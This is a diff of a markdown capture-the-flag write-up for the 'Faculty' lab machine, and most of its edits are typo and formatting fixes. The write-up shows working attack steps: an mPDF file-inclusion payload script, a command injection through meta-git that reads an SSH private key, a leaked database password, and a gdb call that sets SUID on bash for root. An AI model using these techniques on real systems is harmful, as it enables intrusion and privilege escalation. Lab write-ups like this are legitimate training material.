@@ -66,7 +66,7 @@ Now that we are admin on the site, we can start enumarating again.
 Cookie: PHPSESSID=o7987bp4js9jm58hh523hm2i9n
 ```
 
-The faculty list page gives us all the existing faculty ID and lets us create new ones, so not need to atempt the IDOR anymore. 
+The faculty list page gives us all the existing faculty ID and lets us create new ones, so no need to atempt the IDOR anymore. 
 ![users.png](users.png)
 
 There are 5 pages with the following forms : 
@@ -75,14 +75,13 @@ There are 5 pages with the following forms :
 - subject list  - new subject form - ?action=save_subject  - POST - multipart/form-data 
 - faculty list  - new fac id       - ?action=save_faculty  - POST - application/x-www-form-urlencoded 
 - schedule      - new sched entry  - ?action=save_schedule - POST - multipart/form-data 
-- users         - the new user button is uselessfaict
+- users         - the new user button is useless afaict
 ```
 
 ## SQLi
 
 testing them all for sqli, starting with the only urlencoded one, and it's already a win.  
-```bash
-cat save_faculty.req
+```http
 POST /admin/ajax.php?action=save_faculty HTTP/1.1
 Host: faculty.htb
 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
@@ -152,7 +151,9 @@ looks like it isn't, at leaast for this `save_course` one, lets move on anyways.
 
 ## mPDF
 
-As admin some of the pages also have a button to generate pdfs on the fly, when you hit the button it sends a b64 encoded payload of whatever data is on the page. That data is processed by mPDF on the serverside, and we receive back a 200 OK with the name of the generated pdf in the body, then the client side goes to `/mdpf/tmp/<name>.pdf   
+As admin some of the pages also have a button to generate pdfs on the fly, when you hit the button it sends a b64 encoded payload of whatever data is on the page. 
+
+That data is processed by mPDF on the serverside, and we receive back a 200 OK with the name of the generated pdf in the body, then the client side goes to `/mdpf/tmp/<name>.pdf`   
 
 Doing some basic forensics on the pdfs, it looks like they're generated with mPDF version 6.0.  
 ```bash
@@ -182,7 +183,7 @@ Modify Date                     : 2022:10:16 10:20:27+01:00
 
 looking at searchsploit there seems to be only one relevant exploit: 
 ```bash
-mPDF                           130 ⨯
+mPDF
 ----------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                         |  Path
 ----------------------------------------------------------------------- ---------------------------------
@@ -247,7 +248,9 @@ if __name__ == ("__main__"):
     terminal= Terminal()
     terminal.cmdloop()
 ```
-this seemed promissing as it's generating b64 payloads to send to mPDF, trying to replace the payload in burp and see if that returns anything interesting, it returns an empty pdf. Tried to look at it with strings, but I don't think the files are actually beeing included in it. 
+this seemed promissing as it's generating b64 payloads to send to mPDF, trying to replace the payload in burp and see if that returns anything interesting, it returns an empty pdf.  
+
+I tried to look at it with strings, but I don't think the files are actually beeing included in it. 
 
 Googling further, I found a buch more things, and tried a bunch of CVEs below, they should all be ongoing as they've all been patched way after 6.0.   
 ```
@@ -263,9 +266,8 @@ Looking into the deserialization, looks like the phar/jpeg needs to be hosted lo
 
 That annotation tag thing was super hard to find, but it works, let look at it closer
 
-
 ## mPDF includes files in html annotation tags
-so according to this github issue: [https://github.com/mpdf/mpdf/issues/356](https://github.com/mpdf/mpdf/issues/356)  
+So according to this github issue: [https://github.com/mpdf/mpdf/issues/356](https://github.com/mpdf/mpdf/issues/356)  
 
 We could abuse the html tags to have mPDF include system files in the pdf, like this: 
 ```html
@@ -274,7 +276,7 @@ We could abuse the html tags to have mPDF include system files in the pdf, like 
 
 Which means that we would we need to inject that in the payload somehow, so lets try to get it decoded furthter.
 
-Probing around with cyberchef it it's urlencoded twice, and then base64 on top  
+Probing around with cyberchef we can see that it's urlencoded twice, and then base64 on top  
 ![cyber-chef.png](cyber-chef.png)
 
 So we get something like that
@@ -383,7 +385,8 @@ gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
 developer:x:1001:1002:,,,:/home/developer:/bin/bash
 ```
 
-So is the very first thing we tried actually, except that script worked if the backend did one urldecode and one base64 decode, but as we saw before the owners of the box made a second urlencode /decode to throw us off, so this simple change on the script would've generated a working payload:  
+So is the very first thing we tried actually, that script would've worked if the backend did one urldecode and one base64 decode, but as we saw before the owner of the box makes it do a second urlencode /decode to throw us off, (and it worked).  
+So this simple change on the script would've generated a working payload:  
 ```bash
 diff old-lfi.py lfi.py
 33c33
@@ -392,7 +395,7 @@ diff old-lfi.py lfi.py
 >     encoded_payload = quote(quote(payload))
 ```
 
-so we can use a slightly modified version of that now:  
+Let's use a slightly modified version of that now:  
 ```python
 import sys
 from urllib.parse import quote
@@ -424,12 +427,12 @@ if __name__ == ("__main__"):
     banner()
     payload_gen(sys.argv[1])
 ```
-sending invalid queries in burp earlier an error leaked a source file path to us:  
+Sending invalid queries in burp earlier an error leaked a source file path to us:  
 ```
 curl "http://faculty.htb/admin/ajax.php?action=save_course"
 ```
 
-so we can start by leaking that with the mPDF annotation LFI
+So we can start by leaking that with the mPDF annotation LFI
 ```bash
 python3 lfi.py /var/www/scheduling/admin/admin_class.php
                           _____  _____  ______   ______ ___  __   __                  _       _ _
@@ -920,7 +923,6 @@ JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlJTI1M0QlMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4v
 
 $conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
 ```
-wow, no wonder we couldn't crack this one  
 
 Because we leaked /etc/passwd we know the sched is not a unix user but maybe the password was reused with one of the other users, wich luckily it was with gbyolo.  
 ```bash
@@ -946,7 +948,7 @@ gbyolo has sudo priviledges to developper using something called meta-git
 There's a poc for RCE on that:  
 [https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)   
 [https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49](https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49)  
-It only triggers if curent directory is / though for reasons that are beyond me
+It only triggers if curent directory is / though for reasons that are beyond me  
 Edit - It works because it needs to be in a place the developper can read, so not in the gbyolo home  
 /dev/shm works too .. 
 ```bash
@@ -1007,7 +1009,7 @@ id_rsa: command 'git clone asdf || cat ~/.ssh/id_rsa id_rsa' exited with error: 
 ```
 
 ## Privesc with GDB
-We're now developer, looking at the groups, it's a member of debug, which gives access to use gdb on a running processes, and I saw that gdb is install with leanpeas earlier.  
+We're now developer, looking at the groups, it's a member of debug, which gives access to use gdb on a running processes, and I saw that gdb is installed with linpeas earlier.  
 ```bash
 id
 uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
@@ -1022,6 +1024,9 @@ root         716       1  0 12:25 ?        00:00:00 /usr/bin/python3 /usr/bin/ne
 ```
 
 dropping a system call with the debugger and giving suid to bash  
+```bash
+gdb -p 716
+```
 ```bash
 (gdb) call (void)system("chmod u+s /bin/bash")
 [Detaching after vfork from child process 21697]
